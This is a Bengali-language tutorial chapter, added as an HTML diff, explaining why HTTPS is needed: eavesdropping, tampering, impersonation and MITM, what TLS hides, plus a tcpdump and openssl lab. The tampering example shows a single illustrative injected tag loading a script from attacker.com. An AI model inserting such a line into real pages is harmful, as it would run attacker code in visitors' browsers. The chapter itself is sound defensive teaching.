@@ -1,0 +1,266 @@
+<section class="chapter" id="ch31">
+  <div class="ch-eyebrow">Chapter 31</div>
+  <h1>Why HTTPS?</h1>
+  <p class="ch-lede">HTTP-র প্রতিটি byte plaintext-এ যায়। আপনার packet আপনার machine থেকে server পর্যন্ত ১৫টি router, ৩টি ISP, এবং হয়তো কয়েকটি অজানা middlebox পেরোয়। তাদের প্রত্যেকে সবকিছু পড়তে পারে — এবং বদলাতেও পারে।</p>
+
+  <h2>31.1 Plaintext HTTP-তে কী দেখা যায়</h2>
+
+  <div class="cb diagram"><pre>আপনি ──▶ Wi-Fi ──▶ Router ──▶ ISP ──▶ ... ──▶ Server
+          ↑          ↑          ↑        ↑
+          └──────────┴──────────┴────────┘
+            এই প্রত্যেকটি বিন্দুতে যে কেউ
+            পুরো traffic পড়তে ও বদলাতে পারে
+
+Plaintext HTTP-তে তারে যা যায়:
+
+  POST /login HTTP/1.1
+  Host: bank.example.com
+  Content-Type: application/x-www-form-urlencoded
+  Cookie: session=abc123xyz
+
+  username=reza&password=MySecret123
+
+  ★ password স্পষ্ট অক্ষরে ★
+  ★ session cookie স্পষ্ট — চুরি করে ব্যবহার করা যায় ★
+  ★ পুরো URL, সব header, পুরো body ★</pre></div>
+
+  <h2>31.2 তিনটি ভিন্ন সমস্যা</h2>
+
+  <div class="tw"><table>
+    <thead><tr><th>সমস্যা</th><th>আক্রমণ</th><th>সমাধান</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Confidentiality</strong><br>(গোপনীয়তা)</td><td>Eavesdropping — কেউ পড়ে ফেলছে</td><td>Encryption</td></tr>
+      <tr><td><strong>Integrity</strong><br>(অখণ্ডতা)</td><td>Tampering — কেউ বদলে দিচ্ছে</td><td>MAC / AEAD</td></tr>
+      <tr><td><strong>Authentication</strong><br>(পরিচয় যাচাই)</td><td>Impersonation — নকল server</td><td>Certificate + CA</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="box warn">
+    <div class="bt">⚠️ শুধু encryption যথেষ্ট নয় — একটি গুরুত্বপূর্ণ ভুল ধারণা</div>
+    <p>ধরুন আপনি শুধু encryption করলেন, কিন্তু server-এর পরিচয় যাচাই করলেন না। তখন:</p>
+    <div class="cb diagram"><pre>আপনি ──encrypted──▶ ??? ──encrypted──▶ আসল server
+                     ↑
+              আক্রমণকারী এখানে
+
+সে আপনার সাথে একটি encrypted connection করল,
+এবং server-এর সাথে আরেকটি encrypted connection করল।
+
+দুটোই "নিরাপদ" — কিন্তু সে মাঝখানে সবকিছু
+পড়তে ও বদলাতে পারছে।
+
+এটাই ★man-in-the-middle (MITM)★ আক্রমণ।</pre></div>
+    <p><strong>এজন্যই তিনটি একসাথে দরকার।</strong> Encryption ছাড়া integrity অর্থহীন, authentication ছাড়া encryption অর্থহীন। TLS তিনটিই দেয়।</p>
+  </div>
+
+  <h2>31.3 বাস্তব আক্রমণের দৃশ্য</h2>
+
+  <div class="tabs" id="tabs-attack">
+    <div class="tab-btns">
+      <button class="on" data-t="at1">Passive Eavesdropping</button>
+      <button data-t="at2">Active Tampering</button>
+      <button data-t="at3">Impersonation</button>
+    </div>
+    <div class="tab-body">
+      <div class="tab-pane on" id="at1">
+        <div class="cb diagram"><pre>দৃশ্য: café-র Wi-Fi
+
+আক্রমণকারী শুধু চুপচাপ শুনছে (promiscuous mode,
+বা ARP spoofing করে traffic নিজের দিকে টেনে — Ch 8)
+
+সে পায়:
+  ✓ আপনি কোন site-এ যাচ্ছেন
+  ✓ আপনার session cookie  → ★ account দখল ★
+  ✓ Login form-এর password
+  ✓ আপনার পড়া প্রতিটি page
+  ✓ আপনার পাঠানো প্রতিটি message
+
+সবচেয়ে ভয়ানক দিক: কোনো চিহ্ন থাকে না।
+আপনি কখনো জানবেন না।
+
+★ HTTPS-এ সে শুধু পায়: আপনি কোন IP-তে যাচ্ছেন,
+  কত bytes, এবং SNI থেকে domain নাম (Ch 33)।
+  বাকি সব অদৃশ্য।</pre></div>
+      </div>
+      <div class="tab-pane" id="at2">
+        <div class="cb diagram"><pre>দৃশ্য: আক্রমণকারী বা এমনকি একটি ISP
+
+Traffic শুধু পড়ছে না — বদলে দিচ্ছে:
+
+  Server পাঠাল:
+    &lt;script src="/app.js"&gt;&lt;/script&gt;
+
+  আপনার কাছে পৌঁছাল:
+    &lt;script src="/app.js"&gt;&lt;/script&gt;
+    &lt;script src="//attacker.com/steal.js"&gt;&lt;/script&gt;
+
+বাস্তব ঘটনা (কল্পনা নয়):
+  • কিছু ISP plaintext HTTP page-এ বিজ্ঞাপন inject করত
+  • কিছু hotel Wi-Fi নিজেদের banner যোগ করত
+  • "Great Cannon" আক্রমণে JavaScript inject করে
+    ব্যবহারকারীদের browser দিয়ে DDoS চালানো হয়েছিল
+  • Download করা executable-এ malware যোগ করা হয়েছে
+
+★ Integrity protection ছাড়া আপনি কখনো নিশ্চিত হতে
+  পারবেন না যে আপনার কাছে যা পৌঁছাল তা server
+  পাঠিয়েছিল।</pre></div>
+      </div>
+      <div class="tab-pane" id="at3">
+        <div class="cb diagram"><pre>দৃশ্য: DNS spoofing বা ARP spoofing
+
+আপনি লিখলেন: bank.example.com
+
+আক্রমণকারী DNS-এর জাল উত্তর দিল, বা ARP spoofing
+করে নিজেকে gateway বানাল।
+
+আপনি পৌঁছালেন তার server-এ, যা হুবহু আসল
+bank-এর মতো দেখতে।
+
+আপনি password দিলেন। সে পেয়ে গেল।
+
+★ HTTPS-এ এটি ব্যর্থ হয় ★
+  কারণ আক্রমণকারীর কাছে bank.example.com-এর জন্য
+  একটি বৈধ certificate নেই — এবং কোনো CA তাকে
+  সেটি দেবে না, কারণ সে domain-টির মালিকানা প্রমাণ
+  করতে পারবে না।
+
+  Browser দেখাবে: "Your connection is not private
+  — NET::ERR_CERT_AUTHORITY_INVALID"
+
+  এই সতর্কবার্তাটিই HTTPS-এর সবচেয়ে গুরুত্বপূর্ণ
+  অবদান — এটি ছাড়া আপনি কখনো জানতেন না।</pre></div>
+      </div>
+    </div>
+  </div>
+
+  <h2>31.4 HTTPS = HTTP + TLS</h2>
+
+  <div class="cb diagram"><pre>HTTP-তে কোনো পরিবর্তন হয় না। শুধু নিচে একটি স্তর যোগ হয়:
+
+    HTTP                      HTTPS
+   ┌────────┐               ┌────────┐
+   │ HTTP   │               │ HTTP   │  ← হুবহু একই
+   ├────────┤               ├────────┤
+   │        │               │  TLS   │  ← ★ নতুন স্তর ★
+   │  TCP   │               ├────────┤
+   ├────────┤               │  TCP   │
+   │  IP    │               ├────────┤
+   └────────┘               │  IP    │
+                            └────────┘
+
+  Port 80                    Port 443
+
+★ HTTP-র একটি byte-ও বদলায়নি। একই method, একই
+  header, একই status code। TLS শুধু সেই bytes-গুলোকে
+  encrypt করে পাঠায়।
+
+এজন্যই আপনার application code HTTPS-এর জন্য কিছুই
+বদলাতে হয় না — শুধু URL-এ 's' যোগ হয়।</pre></div>
+
+  <div class="box tip">
+    <div class="bt">✓ TLS শুধু HTTP-র জন্য নয়</div>
+    <p>TLS একটি সাধারণ-উদ্দেশ্যের নিরাপত্তা-স্তর, যা যেকোনো TCP-ভিত্তিক protocol-এর নিচে বসতে পারে:</p>
+    <div class="chips">
+      <span class="chip">HTTPS = HTTP + TLS</span>
+      <span class="chip">SMTPS = SMTP + TLS</span>
+      <span class="chip">IMAPS = IMAP + TLS</span>
+      <span class="chip">LDAPS = LDAP + TLS</span>
+      <span class="chip">PostgreSQL + TLS</span>
+      <span class="chip">MQTT + TLS</span>
+      <span class="chip">gRPC + TLS</span>
+    </div>
+    <p>এটিই layering-এর শক্তির চমৎকার উদাহরণ — একটি স্তর একবার লিখে বহু protocol-এ পুনর্ব্যবহার।</p>
+  </div>
+
+  <h2>31.5 "আমার site-এ সংবেদনশীল কিছু নেই" — কেন এই যুক্তি ভুল</h2>
+
+  <div class="box warn">
+    <div class="bt">⚠️ HTTPS শুধু গোপনীয়তার জন্য নয়</div>
+    <ul>
+      <li><strong>Integrity:</strong> HTTP হলে ISP বা café-র Wi-Fi আপনার page-এ বিজ্ঞাপন বা malware inject করতে পারে। আপনার site-এ "গোপন" কিছু না থাকলেও আপনার ব্যবহারকারীরা ক্ষতিগ্রস্ত হবে।</li>
+      <li><strong>Authenticity:</strong> HTTPS ছাড়া ব্যবহারকারী জানতে পারে না সে আসলেই আপনার server-এর সাথে কথা বলছে।</li>
+      <li><strong>Browser-এর বাধ্যবাধকতা:</strong> Service Worker, Geolocation, Camera/Microphone, HTTP/2, HTTP/3, Web Crypto — এসব API শুধু secure context-এ কাজ করে। HTTP মানে এগুলো ব্যবহার করাই যাবে না।</li>
+      <li><strong>SEO ও ব্যবহারকারীর আস্থা:</strong> Browser এখন HTTP site-এ "Not Secure" দেখায়।</li>
+      <li><strong>খরচ শূন্য:</strong> Let's Encrypt বিনামূল্যে, স্বয়ংক্রিয়ভাবে নবায়নযোগ্য certificate দেয়। Caddy-র মতো server এটি সম্পূর্ণ স্বয়ংক্রিয়ভাবে করে।</li>
+    </ul>
+    <p>একই যুক্তি <strong>internal service-এর জন্যও প্রযোজ্য</strong>। "আমাদের private network" ধরে নিরাপদ ভাবা আধুনিক নিরাপত্তা-চিন্তায় (zero trust) গ্রহণযোগ্য নয় — Chapter 7 ও 8-এ আমরা দেখেছি local network কতটা সহজে আপস করা যায়।</p>
+  </div>
+
+  <h2>31.6 TLS যা লুকায় এবং যা লুকায় না</h2>
+
+  <div class="cb diagram"><pre>একজন পর্যবেক্ষক HTTPS traffic দেখে যা জানতে পারে:
+
+  ✓ আপনার IP এবং server-এর IP
+  ✓ Port (443 → HTTPS)
+  ✓ Connection কখন শুরু, কখন শেষ
+  ✓ কত bytes গেল, কত এল
+  ✓ Packet-এর timing ও আকারের ধরন
+  ✓ ★ Domain নাম ★ — TLS handshake-এর SNI field থেকে
+  ✓ ★ Certificate ★ — এটিও plaintext-এ যায়
+  ✓ DNS query (যদি DoH/DoT না থাকে)
+
+  ✗ URL-এর path ও query
+  ✗ HTTP header (cookie, authorization)
+  ✗ Request/response body
+  ✗ আপনি কোন page দেখলেন
+
+★ অর্থাৎ TLS লুকায় "কী", কিন্তু "কার সাথে" নয়।
+
+Encrypted Client Hello (ECH) SNI-ও encrypt করার
+চেষ্টা করছে, কিন্তু এখনো সর্বত্র প্রচলিত নয়।
+
+আর traffic analysis একটি বাস্তব ঝুঁকি: packet-এর
+আকার ও timing-এর ধরন দেখে কখনো কখনো অনুমান করা
+যায় কোন page দেখা হচ্ছে।</pre></div>
+
+  <div class="lab">
+    <div class="lab-h">🧪 Lab 31 — Plaintext এবং encrypted পাশাপাশি</div>
+    <p class="lab-q">আমরা কী দেখতে চাইছি? — HTTP-তে আপনার data কতটা স্পষ্টভাবে দৃশ্যমান, এবং HTTPS-এ কতটা লুকানো।</p>
+    <div class="cb"><span class="cb-lang">bash</span><pre># HTTP — সবকিছু পড়া যায়
+sudo tcpdump -i any -n -A -c 20 'tcp port 80' &
+curl -s "http://example.com/search?q=my-secret-query" > /dev/null
+# output-এ পুরো request text দেখতে পাবেন
+
+# HTTPS — শুধু আবর্জনা
+sudo tcpdump -i any -n -A -c 20 'tcp port 443' &
+curl -s "https://example.com/search?q=my-secret-query" > /dev/null
+# শুধু binary noise — কিন্তু প্রথম packet-এ SNI দেখা যাবে
+
+# SNI (domain নাম) plaintext-এ যায় — প্রমাণ করুন
+sudo tcpdump -i any -n -A -c 5 'tcp port 443' 2>/dev/null | grep -a example
+
+# Certificate নিজে দেখুন
+openssl s_client -connect example.com:443 -servername example.com &lt;/dev/null 2>/dev/null \
+  | openssl x509 -noout -subject -issuer -dates</pre></div>
+    <p><strong>যা লক্ষ্য করবেন:</strong> HTTP-র dump-এ <code>GET /search?q=my-secret-query</code> স্পষ্ট অক্ষরে পড়া যাচ্ছে — সাথে সব header ও cookie। HTTPS-এর dump-এ শুধু অর্থহীন byte, কিন্তু প্রথম packet-এ (ClientHello) <code>example.com</code> লেখাটি পাওয়া যাবে — এটাই SNI। Certificate-এ দেখবেন কার নামে ইস্যু, কে ইস্যু করেছে (CA), এবং মেয়াদ।</p>
+    <p><strong>আমরা কী শিখলাম:</strong> "HTTP অনিরাপদ" কোনো তাত্ত্বিক দাবি নয় — আপনি নিজের চোখে আপনার query, cookie ও password তারে যেতে দেখলেন। আর HTTPS-ও সবকিছু লুকায় না: domain নাম তখনো দৃশ্যমান।</p>
+  </div>
+
+  <div class="recap">
+    <div class="rt">📌 Chapter Summary</div>
+    <ul>
+      <li>Plaintext HTTP-তে পথের যে কেউ সবকিছু পড়তে ও বদলাতে পারে — কোনো চিহ্ন না রেখে।</li>
+      <li>তিনটি ভিন্ন সমস্যা: <strong>confidentiality</strong> (পড়া), <strong>integrity</strong> (বদলানো), <strong>authentication</strong> (নকল পরিচয়)।</li>
+      <li>শুধু encryption যথেষ্ট নয় — authentication ছাড়া MITM আক্রমণ সফল হয়।</li>
+      <li><strong>HTTPS = HTTP + TLS</strong>; HTTP-র একটি byte-ও বদলায় না।</li>
+      <li>TLS একটি সাধারণ স্তর — SMTP, IMAP, PostgreSQL, gRPC সবকিছুতে ব্যবহৃত।</li>
+      <li>"সংবেদনশীল কিছু নেই" যুক্তি ভুল: integrity, browser API, এবং ব্যবহারকারীর নিরাপত্তা সবার জন্যই দরকার।</li>
+      <li>TLS লুকায় "কী", কিন্তু "কার সাথে" নয় — IP ও SNI দৃশ্যমান থাকে।</li>
+    </ul>
+  </div>
+
+  <div class="quiz-title">✓ Quick Check</div>
+  <details class="qa"><summary>শুধু encryption থাকলে কিন্তু authentication না থাকলে কী সমস্যা?</summary>
+    <div class="ans"><p>Man-in-the-middle আক্রমণ সফল হয়। আক্রমণকারী আপনার সাথে একটি encrypted connection এবং আসল server-এর সাথে আরেকটি encrypted connection করে। দুটোই কারিগরিভাবে "নিরাপদ", কিন্তু সে মাঝখানে সব plaintext দেখে ও বদলাতে পারে। Certificate-এর কাজ হলো নিশ্চিত করা যে আপনি যার সাথে key বিনিময় করছেন সে-ই প্রকৃত server।</p></div>
+  </details>
+  <details class="qa"><summary>HTTPS ব্যবহার করলে একজন পর্যবেক্ষক কী কী তখনো দেখতে পায়?</summary>
+    <div class="ans"><p>আপনার IP, server-এর IP ও port, connection-এর সময় ও স্থায়িত্ব, transfer হওয়া bytes-এর পরিমাণ, packet-এর timing ও আকারের ধরন, TLS handshake-এর <strong>SNI</strong> থেকে domain নাম, এবং server-এর certificate। সে দেখতে পায় না: URL-এর path/query, header, cookie, এবং body।</p></div>
+  </details>
+  <details class="qa"><summary>একটি static blog-এ (কোনো login নেই, কোনো form নেই) HTTPS দরকার কি?</summary>
+    <div class="ans"><p>হ্যাঁ। গোপনীয়তার জন্য নয়, মূলত <strong>integrity</strong>-র জন্য: HTTP হলে ISP বা café-র Wi-Fi আপনার page-এ বিজ্ঞাপন বা ক্ষতিকর script inject করতে পারে, এবং আপনার পাঠকরা ক্ষতিগ্রস্ত হবেন। এছাড়া HTTP/2, HTTP/3 ও আধুনিক browser API শুধু secure context-এ কাজ করে, browser "Not Secure" দেখায়, এবং Let's Encrypt-এর কারণে খরচ শূন্য।</p></div>
+  </details>
+
+  <div class="chnav">
+    <a href="#ch30"><div class="d">পূর্ববর্তী</div><div class="t">Ch 30 — HTTP Connections</div></a>
+    <a class="nx" href="#ch32"><div class="d">পরবর্তী</div><div class="t">Ch 32 — Cryptography for Developers</div></a>
+  </div>
+</section>
